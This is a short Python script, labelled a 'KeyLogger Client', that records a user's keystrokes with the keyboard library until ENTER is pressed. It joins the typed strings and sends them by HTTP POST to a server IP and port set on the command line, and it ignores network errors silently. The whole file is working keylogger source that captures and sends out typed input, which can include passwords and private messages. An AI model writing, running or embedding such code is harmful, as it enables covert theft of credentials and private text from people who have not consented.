import keyboard
import requests
import argparse
import sys

def send_to_server(text, ip, port):
    url = f"http://{ip}:{port}"
    try:
        requests.post(url, data=text, timeout=2)
    except requests.RequestException:
        pass # Silent failure

def main():
    parser = argparse.ArgumentParser(description='KeyLogger Client')
    parser.add_argument('--ip', default='127.0.0.1', help='Server IP')
    parser.add_argument('--port', type=int, default=8080, help='Server Port')
    
    args = parser.parse_args()
    
    print("[*] Recording keys until ENTER is pressed...")
    # Record logic
    keys = keyboard.record(until='ENTER')
    
    # Process
    text_content = ""
    for text in keyboard.get_typed_strings(keys):
        text_content += text + "\n"
        
    print("[*] Recording complete. Sending report...")
    send_to_server(text_content, args.ip, args.port)
    print("[*] Report sent.")

if __name__ == '__main__':
    main()